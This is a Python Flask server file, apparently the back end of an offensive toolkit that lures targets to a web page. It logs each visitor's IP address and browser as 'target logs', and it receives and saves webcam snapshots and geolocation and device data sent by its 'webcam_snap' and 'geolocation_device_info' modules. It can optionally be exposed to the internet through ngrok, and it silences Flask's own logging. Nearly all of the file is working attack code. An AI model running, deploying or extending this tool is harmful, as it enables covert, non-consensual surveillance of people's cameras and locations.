from random import randint, choice
from datetime import datetime
from flask import Flask, render_template, request
from base64 import b64decode as b64
from . import config
import logging
import click
import os

class server:
	def __init__(self,port,param,page='final.html'):
		self.port = port
		self.param = param # For checking if multiple modules were passed or not
		self.page = page
		self.conn_num = 0
		self.ip = ''
		self.ua = ''
		if config.use_ngrok:
			self.url = config.ngrok_url.replace('http://', 'https://')
		else:
			self.url = 'http://127.0.0.1:5000'
		print(f'\n\n[*] SERVER STARTED at {self.url}\n')
		self.main()

	def write_target_logs(self, data):
		mode = 'w'
		if os.path.isfile('iplog.txt'):
			mode = 'a'
		with open('iplog.txt',mode) as f:
			f.write(data+'\n')

	def GenName(self): # For generating random word
		a = ''
		for i in range(randint(5,10)):
			a+=choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')
		return a

	def main(self):

		app = Flask(__name__)

		# To prevent flask from printing data
		def secho(text,file=None,nl=None,err=None,color=None,**styles):
			pass
		def echo(text,file=None,nl=None,err=None,color=None,**styles):
			pass
		click.echo = echo
		click.secho = secho
		log = logging.getLogger('werkzeug')
		log.setLevel(logging.ERROR)
		
		'''
			Here you can create routes for your modules for saving data.
		'''

		@app.route('/',methods=['POST','GET'])
		def home():
			self.ua = request.user_agent
			self.ip = request.remote_addr
			self.write_target_logs(str(self.conn_num)+'. '+str(request.user_agent)+': '+str(request.remote_addr)+'\n\n')
			print(f'\n{self.conn_num+1} [+] {config.GREEN}INCOMING REQUEST FROM {request.remote_addr}:- {config.WHITE}{config.YELLOW} {request.user_agent}{config.WHITE}\n')
			self.conn_num+=1
			return render_template(self.page)

		@app.route('/savepic',methods=['POST','GET']) # This is where the webcam_snap module sends its data
		def savepic():
			if request.method == 'POST':
				print(f'\n{self.conn_num+1} [+] {config.GREEN}WEBCAM_SNAP INVOKED BY  {self.ip}:- {config.WHITE}{config.YELLOW} {request.user_agent} {config.WHITE}{config.GREEN}WAITING FOR PIC.{config.WHITE}\n')
				name = '[PIC]_'+datetime.now().strftime('%Y_%m_%d-%H_%M_%S')+'_'+self.GenName()+'.jpeg'
				with open(name,'wb') as f:
					f.write(b64(request.get_json().replace('data:image/jpeg;base64,','')))
					print(f'\n{self.conn_num+1} [+] {config.GREEN}PIC RECEIVED FROM {self.ip}:- {config.WHITE}{config.YELLOW} {self.ua}{config.WHITE}\n')
				return '200','OK'

		@app.route('/saveinfo',methods=['POST','GET']) # This is where the geolocation_device_info module sends its data
		def saveinfo():
			if request.method == 'POST':
				print(f'\n{self.conn_num+1} [+] {config.GREEN}GEOLOCATION_DEVICE_INFO INVOKED BY  {self.ip}:- {config.WHITE}{config.YELLOW} {self.ua} {config.WHITE}{config.GREEN}WAITING FOR INFO.{config.WHITE}\n')
				name = '[DEVICE_INFO_GEO]' + datetime.now().strftime('%Y_%m_%d-%H_%M_%S')+'_'+self.GenName()+'.txt'
				with open(name,'w') as f:
					f.write(request.get_json())
					print(f'\n{self.conn_num+1} [+] {config.GREEN}INFO RECEIVED FROM  {self.ip}:- {config.WHITE}{config.YELLOW} {self.ua} {config.WHITE}{config.WHITE}\n')
				return '200','OK'

		@app.route('/saverror',methods=['POST','GET']) # All modules should send error logs here
		def saverror():
			if request.method == 'POST':
				with open('error_log.txt','a') as f:
					f.write(datetime.now().strftime('%Y_%m_%d-%H_%M_%S')+': '+str(request.get_json()))
		app.run(host="0.0.0.0",port=config.port,debug=False)
